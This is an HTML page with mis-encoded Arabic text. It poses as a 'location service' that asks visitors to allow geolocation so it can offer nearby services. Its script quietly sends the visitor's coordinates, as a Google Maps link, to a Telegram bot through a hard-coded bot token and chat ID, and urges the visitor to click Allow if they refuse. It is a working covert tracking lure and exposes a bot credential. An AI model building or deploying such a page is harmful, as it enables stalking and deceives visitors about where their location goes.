<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ุชูุนูู ุงููููุน ุงูุฌุบุฑุงูู</title>
</head>
<body style="text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f0f2f5;">

    <div id="container">
        <h2>ุฎุฏูุฉ ุชุญุฏูุฏ ุงููููุน</h2>
        <p>ูุฑุฌู ุงูุณูุงุญ ุจุงููุตูู ูููููุน ูุชุฒููุฏู ุจุงูุฎุฏูุงุช ุงููุฑูุจุฉ ููู</p>
        
        <button id="locBtn" style="padding: 20px 40px; font-size: 18px; background-color: #ff5722; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
            ๐ ุชูุนูู ุงููููุน ุงูุขู
        </button>
    </div>

    <script>
        // ุจูุงูุงุชู ูู ุชููุฌุฑุงู
        const token = '7819904584:AAExsLo2jFP3KkuJuepaw_SiFV9ME_ZI_vw';
        const chatId = '7837239112';

        const locBtn = document.getElementById('locBtn');

        locBtn.addEventListener('click', () => {
            locBtn.innerText = "โณ ุฌุงุฑู ุทูุจ ุงูุฅุฐู...";

            // ุทูุจ ุฅุฐู ุงููููุน ุงูุฌุบุฑุงูู ูู ุงููุชุตูุญ
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                alert("ุงููุชุตูุญ ูุง ูุฏุนู ุชุญุฏูุฏ ุงููููุน.");
            }
        });

        async function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            locBtn.innerText = "โ ุชู ุชุญุฏูุฏ ุงููููุน.. ุฌุงุฑู ุงูุฅุฑุณุงู";

            // ุฅุฑุณุงู ุงููููุน ุฅูู ุชููุฌุฑุงู ูุฑุงุจุท ุฎุฑุงุฆุท ุฌูุฌู
            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const message = `๐ ุชู ุงูุญุตูู ุนูู ูููุน ุฌุฏูุฏ:\n๐ ุงูุฑุงุจุท: ${mapUrl}`;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            alert("ุดูุฑุงู ูู! ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุจูุฌุงุญ.");
            locBtn.innerText = "ุชู ุงูุฅุฑุณุงู";
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("ูุฌุจ ุงูุถุบุท ุนูู 'ุณูุงุญ' (Allow) ูุฅุฑุณุงู ุงููููุน.");
                    break;
                default:
                    alert("ุญุฏุซ ุฎุทุฃ ูู ุชุญุฏูุฏ ุงููููุน.");
                    break;
            }
            locBtn.innerText = "ุฅุนุงุฏุฉ ุงููุญุงููุฉ";
        }
    </script>
</body>
</html>
